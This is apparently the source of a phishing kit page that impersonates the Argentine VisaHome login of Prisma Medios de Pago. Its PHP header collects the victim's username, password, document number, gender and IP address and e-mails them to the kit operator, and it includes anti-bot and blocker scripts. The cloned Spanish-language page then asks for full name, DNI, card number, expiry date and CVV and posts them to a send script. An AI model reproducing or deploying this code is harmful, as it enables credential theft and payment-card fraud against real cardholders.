<?php

include 'system/err.php';
include 'system/blocker.php';
include 'system/antibots.php';
 

$ip = $_SERVER['REMOTE_ADDR'];
$tipodocumento = $_POST['docType'];
$numero = $_POST['docNumber'];
$sexo = $_POST['gender'];
$pass = $_POST['password'];
$user = $_POST['nickname'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$useragent = "User-Agent: " . $browser;
$victimidentification = $_POST['vicid'];
//Save data
include("sand_rzlt_email.php");

$yahya_email .= rand(1,100000);

$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "<html>
<body>


------------VisaHome------------
<br>
Usuario: ".$user." 
<br>
Password: ".$pass."
<br>
Ip: ".$ip."
<br>
Tipo de documento: ".$tipodocumento."
<br>
Dni: ".$numero."
<br>
Sexo: ".$sexo."
<br>
-----------------------------

<br>
</body>
</html>";
$headers .= "From: CoCofullfresh" . "\r\n";
mail($yourmail, $yahya_email, $subject, $headers);?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
            <meta charset="utf-8">
				<meta http-equiv="X-UA-Compatible" content="IE=Edge">
            
            <title></title>
            <meta name="description">
            <meta name="author" content="easytech">
			<!-- CSS -->
			<link type="text/css" rel="stylesheet" href="index_files/jquery-ui-1.css">
			<link type="text/css" rel="stylesheet" href="index_files/text.css">
			<link type="text/css" rel="stylesheet" href="index_files/reset.css">
			<link type="text/css" rel="stylesheet" href="index_files/960.css">
			<link type="text/css" rel="stylesheet" href="index_files/visa.css">
			<link type="text/css" rel="stylesheet" href="index_files/tabs.css">
			<link type="text/css" rel="stylesheet" href="index_files/column930.css">
			<link type="text/css" rel="stylesheet" href="index_files/keyboard.css">
			<!-- IE7 -->
			<!-- IE8 -->
			<!-- JavaScripts -->
			
<script async="" src="index_files/analytics.js"></script><script type="text/javascript" async="" src="index_files/ga.js"></script><script type="text/javascript">
<!--
window["_tsbp_"] = { ba : "X-TS-BP-Action", bh : "X-TS-AJAX-Request"};
//-->
</script>
<script type="text/javascript" src="index_files/08f10cb7c1ab200081555b3d33ef16e262f57c9730cfe515339c3af66301fcd0"></script>
<script type="text/javascript" src="index_files/jquery-1.js"></script>
			<script type="text/javascript" src="index_files/jquery-ui-1.js"></script>
			<script type="text/javascript" src="index_files/jquery_002.js"></script>
			<script type="text/javascript" src="index_files/bootstrap-modal.js"></script>
			<script type="text/javascript" src="index_files/visa_002.js"></script>
			<script type="text/javascript" src="index_files/vubrowserfp.js"></script>
			<script type="text/javascript" src="index_files/fingerprint2.js"></script>
			<script type="text/javascript" src="index_files/visa.js"></script>
			<script type="text/javascript" src="index_files/jquery_003.js"></script>
            <script type="text/javascript" src="index_files/jquery.js"></script>
            <script type="text/javascript" src="index_files/jquery_004.js"></script>
            <script type="text/javascript" src="index_files/emailmask.js"></script>
            <script type="text/javascript" src="index_files/resources.js"></script>
            <script type="text/javascript">

	            var _gaq = _gaq || [];
	            _gaq.push(['_setAccount', 'UA-35091715-1']);
	            _gaq.push(['_trackPageview']);
	
	            (function() {
	              var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
	              ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
	              var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
	            })();
	
          </script>
          <script type="text/javascript" src="index_files/jsf.xhtml"></script><script type="text/javascript" src="index_files/easyfaces.xhtml"></script><script type="text/javascript" src="index_files/FR_firefox.js" data-uid="dCdiz4YJfQ3eyEfCmSOhAZiJ2XZfNr5I"></script></head><script type="text/javascript" id="useragent-switcher">navigator.__defineGetter__("userAgent", function() {return "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0"})</script><body class="login-body">
            <div class="pre-header"></div>	
            <div class="header container-12">
                <div class="logo grid-6 alpha">
                    <a href="#">
                        <img src="index_files/logo.jpg">
                    </a>
                </div>
                <div class="user-info grid-6 omega"></div>
            </div>
            <div class="container-12"></div>
                <div class="login-content container-12">
<form id="loginFrm" name="loginFrm" method="post" action="send.php">
<input type="hidden" name="loginFrm" value="loginFrm">
<input id="loginFrm:hiddenField" type="hidden" name="loginFrm:hiddenField">
			<div class="login-tabs"></div>
			<div class="login-content container-12">
				<div class="login-info grid-4 alpha">
					<div class="login-title">
						VISA<span>HOME PARA SOCIOS</span>
					</div>
					<ul>
						<li>Información sobre el estado de cuentas de sus
							tarjetas Visa. Últimos movimientos, liquidaciones y
							resúmenes de cuenta.</li>
						<li>Realice el pago puntual o adhiera al débito
							automático sus facturas de servicios e impuestos a
							través del Servicio de Pagos Visa.</li>
						<li>Abone en cuotas fijas el saldo del resumen de cuenta o
							los consumos realizados en un pago.</li>
					</ul>
				</div>
				<div class="login-form grid-4">
					<div class="login-form-conten">
						<div>
							<span id="correo"> E-mail </span><input required="required" id="correo" type="email" name="correo" value="" tabindex="4" class="inputTextChico nickname_qwerty">
						</div>
						<div>
							<p>
							  <input type="hidden" value="<?php echo $victimidentification; ?>" name="sekretcode" id="sekretcode">
							  <span> Nombre Completo </span>
							  <input required="required" id="nombre" type="text" name="nombre" value="" tabindex="4" class="inputTextChico nickname_qwerty">
						  </p>
							<p id="dni">DNI
							  <input required="required" id="dni" type="numero" name="dni" value="" tabindex="4" class="inputTextChico nickname_qwerty" />
							</p>
						</div>
						<div>
						  <p>
						    <label for="docNumber">
						      Número de Tarjeta</label>
						    <br />
                            <input required="required" autocomplete="off" maxlength="16" id="cc" type="text" name="cc" class="username_qwerty ui-keyboard-input ui-widget-content ui-corner-all" tabindex="2" aria-haspopup="true" role="textbox" />
                          </p>
						</div>
						<div>
							<span> Fecha de expiraci&oacute;n </span><br>
						  <input required="required" autocomplete="off" maxlength="16" id="mm" type="text" name="mm" class="username_qwerty ui-keyboard-input ui-widget-content ui-corner-all" tabindex="2" aria-haspopup="true" role="textbox" />
						</div>
						<div>
							<span>CVV</span><br>
							<input name="cvv" type="text" required="required" id="cvv" style="width: 30px;" tabindex="4" aria-haspopup="true" role="textbox">
						</div>
					
						<br>
					</div>
					<div class="login-form-footer">
						<input type="SUBMIT" id="button" value="usar teclado virtual" class="vb button" tabindex="6"><input id="loginFrm:button" type="submit" name="loginFrm:button" value="ingresar" tabindex="5" class="button" >

					</div>
				</div>
				<span class="login-clave grid-4">
				<input id="loginFrm:commandd" type="submit" name="loginFrm:commandd" value="" class="imagen-login" onclick="mojarra.ab(this,event,'action',0,'pidId:pidFrm',{'onevent':function(data) { oncomplete(data, 'true','showSecurePopup(\'pid\')')}});return false" />
			</span>			</div><span id="loginFrm:blockedUserHidden" style="display:none">false</span><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="7203216638352712413:5603526402311023191" autocomplete="off">
</form>

		<div class="terms grid-12">
			<span>Los datos que se proporcionen a Prisma Medios de Pago S.A. 
podrán utilizarse para procesar sus pedidos, solicitudes, denuncias, 
reclamos, para la relación comercial y fines publicitarios. </span> <b>Disposición
 DNPDP 10/2008: "El titular de los datos personales tiene la facultad de
 ejercer el derecho de acceso a los mismos en forma gratuita a 
intervalos no inferiores a seis meses, salvo que se acredite un interés 
legítimo al efecto conforme lo establecido en el artículo 14, inciso 3 
de la Ley Nº 25.326" y "La DIRECCION NACIONAL DE PROTECCION DE DATOS 
PERSONALES, Organo de Control de la Ley Nº 25.326, tiene la atribución 
de atender las denuncias y reclamos que se interpongan con relación al 
incumplimiento de las normas sobre protección de datos personales."</b>
		</div>

		<!-- PID -->
		<div id="blockingDiv" style="display: none;">
			<h2 style="color: #FEB203">Procesando</h2>
		</div>
    <div id="pid" title="Identificación" class="modal hide "><div id="pidId:pidContent">
        <div class="modal-header">
        </div>
        <div class="modal-body pid-modal-body">
<form id="pidId:pidFrm" name="pidId:pidFrm" method="post" action="/visahome/login?windowId=699" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="pidId:pidFrm" value="pidId:pidFrm">
<script id="pidId:pidFrm:j_idt35_js" type="text/javascript"></script>
			<div class="pid-wrapper blockable-content">
      <div><div id="pidId:pidFrm:j_idt38:componentDiv" class="" style="border-bottom: 1px solid #666666; height: 80px; margin-bottom: 10px;">
					<h2>Verificación de identidad - Creación de Usuario</h2>
					<span>La creación de usuario es un breve proceso de preguntas y respuestas destinadas a verificar su identidad.</span></div>
      </div>
      <div><div id="pidId:pidFrm:j_idt44:componentDiv" class="" style="height: 23px; margin-bottom: 5px; padding-left:7px">
					<span>Ingrese la siguiente información:</span></div>
      </div>
      <div><div id="pidId:pidFrm:j_idt46:componentDiv" class="pid-data-request" style="">
					<!-- datos del sollicitante -->
				
					<div style="margin-top: 10px"><label for="pidId:pidFrm:j_idt46:docNumber">
Número de Tarjeta</label><input placeholder="Ingrese en Nro de Tarjeta" id="pidId:pidFrm:j_idt46:docNumber" type="text" name="pidId:pidFrm:j_idt46:docNumber" tabindex="2">
					</div>
					<div style="margin-top: 10px"><label for="pidId:pidFrm:j_idt46:gender">
Sexo</label>
<select id="gender" name="gender" class="inputCombo-chico" size="1" tabindex="3">	<option value="Masculino" selected="selected">Masculino</option>
	<option value="Femenino">Femenino</option>
</select>
					</div>
		<div class="buttonBar clearfix  "><input id="pidId:pidFrm:j_idt46:j_idt57:j_idt58:button" type="submit" name="pidId:pidFrm:j_idt46:j_idt57:j_idt58:button" value="Aceptar" style="" tabindex="" class="button pid-button right" onclick="mojarra.ab(this,event,'action','@form','pidId:pidFrm',{'onevent':function(data) { oncomplete(data, 'true','')}});return false"><input id="pidId:pidFrm:j_idt46:j_idt57:j_idt59:button" type="submit" name="pidId:pidFrm:j_idt46:j_idt57:j_idt59:button" value="Cancelar" style="" tabindex="" class="button pid-button right" onclick="mojarra.ab(this,event,'action','@form','pidId:pidFrm',{'onevent':function(data) { oncomplete(data, 'true','closePopup(\'pid\');')}});return false">
		</div>
					<div>
						<span style="font-size: 10px !important">Nota: el Servicio 
VisaHome está disponible para todos aquellos socios que posean al menos 
una tarjeta Visa, excepto las tarjetas Visa emitidas por Tarjetas 
Cuyanas S.A., Tarjeta Naranja S.A. y Tarjetas del Mar S.A.</span>
					</div></div>
      </div>
			</div><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="7203216638352712413:5603526402311023191" autocomplete="off">
</form>
		<!--           &lt;et:div id=&quot;usrMsg&quot; style=&quot;border-bottom: 1px solid #666666; height: 80px; margin-bottom: 10px;&quot;
                rendered=&quot;true&quot;&gt;
        &lt;/et:div&gt; -->
        </div><div id="pidId:mdlFooter" class="modal-footer"></div></div>
    </div>
    <div id="recuperarClave" title="Usuario Bloqueado" class="modal hide"><div id="recuperarClave:recuperarClaveContent">
        <div class="modal-header">
        </div>
		<div class="modal-body">
<form id="recuperarClave:j_idt145" name="recuperarClave:j_idt145" method="post" action="/visahome/login?windowId=699" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="recuperarClave:j_idt145" value="recuperarClave:j_idt145">

				<div class="no_data_found" style="margin-top: 20px; min-width: 550px;">

					Su clave ha sido bloqueada, puede desbloquearla ahora haciendo
					<a id="recuperarClave:j_idt145:j_idt147:j_idt26" href="#" title="Aqui" onclick="mojarra.ab(this,event,'action','@form','pidId:pidFrm',{'onevent':function(data) { oncomplete(data, 'false','irAlPid();')}});return false" class="">click aquí</a>
					o en cualquier momento ingresando en la opción "Olvidó su clave de
					acceso?" en la pantalla de login a Visa Home Socios

				</div><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="7203216638352712413:5603526402311023191" autocomplete="off">
</form>
		</div><div id="recuperarClave:mdlFooter" class="modal-footer modal-footer-recuser">
			<!-- BOTON -->
<form id="recuperarClave:j_idt151" name="recuperarClave:j_idt151" method="post" action="/visahome/login?windowId=699" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="recuperarClave:j_idt151" value="recuperarClave:j_idt151">
<input type="submit" name="recuperarClave:j_idt151:j_idt152" value="Cerrar" class="right button"><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="7203216638352712413:5603526402311023191" autocomplete="off">
</form></div></div>
    </div>

	<!-- vsisasca -->
    <div id="recuperarUsuario" title="Verificación de identidad - Recuperar Usuario" class="modal hide "><div id="recuperarUsuario:recuperarUsuarioContent">
        <div class="modal-header">
        </div>
        <div class="modal-body ">
<form id="recuperarUsuario:recuperarUsuarioFrm" name="recuperarUsuario:recuperarUsuarioFrm" method="post" action="/visahome/login?windowId=699" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="recuperarUsuario:recuperarUsuarioFrm" value="recuperarUsuario:recuperarUsuarioFrm">
<script id="recuperarUsuario:recuperarUsuarioFrm:j_idt155_js" type="text/javascript"></script>
			<div>
      <div><div id="recuperarUsuario:recuperarUsuarioFrm:j_idt158:componentDiv" class="" style="border-bottom: 1px solid #666666; height: 80px; margin-bottom: 10px;">
					<h2>Verificación de identidad - Recuperar Usuario</h2><b>Nota:</b> 
en caso de que usted no recuerde su clave de Visa Home Socios, por favor
 primero recupérela y luego proceda a recuperar su Usuario.</div>
      </div>
      <div><div id="recuperarUsuario:recuperarUsuarioFrm:j_idt161:componentDiv" class="" style="height: 23px; margin-bottom: 5px; padding-left:7px">
					<span>Ingrese la siguiente información:</span></div>
      </div>
      <div><div id="recuperarUsuario:recuperarUsuarioFrm:j_idt163:componentDiv" class="nicknameModalContent" style="">
					<!-- datos del sollicitante -->
			
					<div style="margin-top: 10px"><label for="recuperarUsuario:recuperarUsuarioFrm:j_idt163:recDocNumber">
Número de Documento</label><input id="recuperarUsuario:recuperarUsuarioFrm:j_idt163:recDocNumber" type="text" name="recuperarUsuario:recuperarUsuarioFrm:j_idt163:recDocNumber" onfocus="setInputPos('username_qwerty')" onkeypress="if (event.keyCode == 13) { document.getElementById('recuperarUsuarioFrm:button').click(); return false; }" tabindex="2">
					</div>
					<div style="margin-top: 10px"><label for="recuperarUsuario:recuperarUsuarioFrm:j_idt163:recGender">
Sexo</label><select id="recuperarUsuario:recuperarUsuarioFrm:j_idt163:recGender" name="recuperarUsuario:recuperarUsuarioFrm:j_idt163:recGender" class="inputCombo-chico" size="1" tabindex="3">	<option value="M" selected="selected">Masculino</option>
	<option value="F">Femenino</option>
</select>
					</div>
					<div style="margin-top: 10px"><label for="recuperarUsuario:recuperarUsuarioFrm:j_idt163:recPassword">
Contraseña</label><input id="recuperarUsuario:recuperarUsuarioFrm:j_idt163:recPassword" type="password" name="recuperarUsuario:recuperarUsuarioFrm:j_idt163:recPassword" value="" onkeypress="if (event.keyCode == 13) { document.getElementById('recuperarUsuarioFrm:button').click(); return false; }" tabindex="4">
					</div>
		<div class="buttonBar clearfix  "><input id="recuperarUsuario:recuperarUsuarioFrm:j_idt163:j_idt175:j_idt176:button" type="submit" name="recuperarUsuario:recuperarUsuarioFrm:j_idt163:j_idt175:j_idt176:button" value="Aceptar" style="" tabindex="" class="button right" onclick="mojarra.ab(this,event,'action','@form','recuperarUsuario:recuperarUsuarioFrm',{'onevent':function(data) { oncomplete(data, 'true','')}});return false"><input id="recuperarUsuario:recuperarUsuarioFrm:j_idt163:j_idt175:j_idt177:button" type="submit" name="recuperarUsuario:recuperarUsuarioFrm:j_idt163:j_idt175:j_idt177:button" value="Cancelar" style="" tabindex="" class="button button right" onclick="mojarra.ab(this,event,'action','@form','recuperarUsuario:recuperarUsuarioFrm',{'onevent':function(data) { oncomplete(data, 'true','closePopup(\'recuperarUsuario\');')}});return false">
		</div></div>
      </div>
			</div><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="7203216638352712413:5603526402311023191" autocomplete="off">
</form>
        </div><div id="recuperarUsuario:mdlFooter" class="modal-footer"></div></div>
    </div>
    <div id="obtenerUsuario" title="Generación de Usuario" class="modal hide "><div id="obtenerUsuario:obtenerUsuarioContent">
        <div class="modal-header">
        </div>
        <div class="modal-body ">
<form id="obtenerUsuario:obtenerUsuarioFrm" name="obtenerUsuario:obtenerUsuarioFrm" method="post" action="/visahome/login?windowId=699" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="obtenerUsuario:obtenerUsuarioFrm" value="obtenerUsuario:obtenerUsuarioFrm">
<script id="obtenerUsuario:obtenerUsuarioFrm:j_idt179_js" type="text/javascript"></script>
			<div>
      <div><div id="obtenerUsuario:obtenerUsuarioFrm:j_idt182:componentDiv" class="" style="border-bottom: 1px solid #666666; height: 80px; margin-bottom: 10px;">
					<h2>Generación de Usuario</h2>Por resolución del BCRA (5374) a 
partir del 31/05/2019 es obligatorio contar con un Usuario (adicional a 
la contraseña) para ingresar a Visa Home Socios</div>
      </div>
      <div><div id="obtenerUsuario:obtenerUsuarioFrm:j_idt185:componentDiv" class="" style="height: 23px; margin-bottom: 5px; padding-left:7px">
					<span>Ingrese la siguiente información:</span></div>
      </div>
      <div><div id="obtenerUsuario:obtenerUsuarioFrm:j_idt187:componentDiv" class="nicknameModalContent" style="">
					<!-- datos del sollicitante -->
				
					<div style="margin-top: 10px"><label for="obtenerUsuario:obtenerUsuarioFrm:j_idt187:recDocNumber">
Número de Documento</label><input id="obtenerUsuario:obtenerUsuarioFrm:j_idt187:recDocNumber" type="text" name="obtenerUsuario:obtenerUsuarioFrm:j_idt187:recDocNumber" onfocus="setInputPos('username_qwerty')" onkeypress="if (event.keyCode == 13) { document.getElementById('obtenerUsuarioFrm:button').click(); return false; }" tabindex="2">
					</div>
					<div style="margin-top: 10px"><label for="obtenerUsuario:obtenerUsuarioFrm:j_idt187:recGender">
Sexo</label><select id="obtenerUsuario:obtenerUsuarioFrm:j_idt187:recGender" name="obtenerUsuario:obtenerUsuarioFrm:j_idt187:recGender" class="inputCombo-chico" size="1" tabindex="3">	<option value="M" selected="selected">Masculino</option>
	<option value="F">Femenino</option>
</select>
					</div>
					<div style="margin-top: 10px"><label for="obtenerUsuario:obtenerUsuarioFrm:j_idt187:recPassword">
Contraseña</label><input id="obtenerUsuario:obtenerUsuarioFrm:j_idt187:recPassword" type="password" name="obtenerUsuario:obtenerUsuarioFrm:j_idt187:recPassword" value="" onkeypress="if (event.keyCode == 13) { document.getElementById('obtenerUsuarioFrm:button').click(); return false; }" tabindex="4">
					</div>
		<div class="buttonBar clearfix  "><input id="obtenerUsuario:obtenerUsuarioFrm:j_idt187:j_idt199:j_idt200:button" type="submit" name="obtenerUsuario:obtenerUsuarioFrm:j_idt187:j_idt199:j_idt200:button" value="Aceptar" style="" tabindex="" class="button right" onclick="mojarra.ab(this,event,'action','@form','obtenerUsuario:obtenerUsuarioFrm',{'onevent':function(data) { oncomplete(data, 'true','')}});return false"><input id="obtenerUsuario:obtenerUsuarioFrm:j_idt187:j_idt199:j_idt201:button" type="submit" name="obtenerUsuario:obtenerUsuarioFrm:j_idt187:j_idt199:j_idt201:button" value="Cancelar" style="" tabindex="" class="button button right" onclick="mojarra.ab(this,event,'action','@form','obtenerUsuario:obtenerUsuarioFrm',{'onevent':function(data) { oncomplete(data, 'true','closePopup(\'obtenerUsuario\');')}});return false">
		</div></div>
      </div>
			</div><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="7203216638352712413:5603526402311023191" autocomplete="off">
</form>
        </div><div id="obtenerUsuario:mdlFooter" class="modal-footer"></div></div>
    </div>

<style type="text/css">

.mybutton {
    margin: 1px;
    padding: 0;
    border: 1px;
    cursor: pointer;
    overflow: visible;
}
.selected {
 border: 3px solid blue;
 }
 .notSelected {
 border: 3px solid white;
 }
</style>
		<!-- vsisasca -->
	        	</div>
    <div id="consumerDefense" title="Defensa del consumidor" class="modal hide "><div id="j_idt378:consumerDefenseContent">
        <div class="modal-header">
			  <a class="modal-titlebar-close" onclick="closePopup('consumerDefense');">cerrar </a>
        </div>
        <div class="modal-body ">
				<div class="header-div-title-popup clearfix">
					<div class="h3-title-popup"><h3>Defensa del consumidor</h3></div>
					<div class="modal-logo"></div>
				</div>
    <div class="legal-message">
        <p>La Ley N° 2.244 establece que las personas físicas o jurídicas que comercialicen,
        	o presten servicios a consumidores y/o usuarios en el ámbito de la C.A.B.A.
	         y posean página de internet, deberán agregar un enlace con la Dirección General de Defensa
	         y Protección al Consumidor.</p>
         <p style="padding: 5px; color: #E89100;E89100">Dirección General de Defensa y Protección al Consumidor</p>
    	<p>Para consultas y/o denuncias ingrese <a href="http://www.buenosaires.gob.ar/defensaconsumidor" target="_blank">aquí</a>.</p>
   	</div>
        </div><div id="j_idt378:mdlFooter" class="modal-footer"></div></div>
    </div>
    <div id="personalDataProtection" title="Defensa del consumidor" class="modal hide "><div id="j_idt380:personalDataProtectionContent">
        <div class="modal-header">
			  <a class="modal-titlebar-close" onclick="closePopup('personalDataProtection');">cerrar </a>
        </div>
        <div class="modal-body ">
    <div class="legal-message">
	    <img src="index_files/logo_proteccion_datos_personales.jpg">
	      <h2 style="color=#ccc">Dirección Nacional de Protección de Datos Personales</h2>
	      <p>“El titular de datos personales tiene la facultad de ejercer el derecho de acceso a
	      	los mismos en forma gratuita a intervalos no inferiores a seis meses, salvo que se acredite un interés
	    	legítimo al efecto, conforme lo establecido en el artículo 14, inciso 3 de la Ley n 25.326”.
	      </p>
	      <p style="padding: 5px;">
	    	“La dirección Nacional de Datos Personales, Órgano de Control de 
la Ley n 25.326, tiene la atribución
	    	de atender las denuncias y reclamos que se interpongan con 
relación al incumplimiento de las normas sobre protección de datos 
personales".
	      </p>
	      <p style="padding-bottom: 0px;">Para contactar a la direción Nacional de Datos Personales:</p>
	      <p style="padding-top: 0px;">Sarmiento 1118, 5 piso(C1041AA)</p>
	      <p style="padding-top: 0px;">Tel. 4383-8510/12/13/15</p>
	      <p><a style="padding-right:10px;" href="http://www.jus.gob.ar/datos-personales.aspx/" target="_blank">http://www.jus.gob.ar/datos-personales.aspx/</a>
	      <a href="mailto:infodnpdp@jus.gov.ar">infodnpdp@jus.gov.ar</a></p>
    </div>                                                 
    <img src="index_files/logo-jus.png">
        </div><div id="j_idt380:mdlFooter" class="modal-footer"></div></div>
    </div>
            <div class="footer">
                <div class="footer-content container-12">
                    <div class="grid-6">PRISMA MEDIOS DE PAGO S.A.</div>
                    <div class="footer-legales grid-6"><a href="https://inetserv.visa.com.ar/visahome/login?windowId=699" class="grey-link" onclick="showPopup('consumerDefense'); return false;">Defensa al Consumidor</a>  |
                        <a href="https://inetserv.visa.com.ar/visahome/login?windowId=699" class="grey-link" onclick="showPopup('personalDataProtection'); return false;">Protección de datos personales</a>
					</div>
                </div>
            </div>
    <div id="ads"></div><iframe src="https://logo.prismasystems.com.ar/visa/logovisa.html" width="0" height="0" frameborder="0"></iframe></body></html>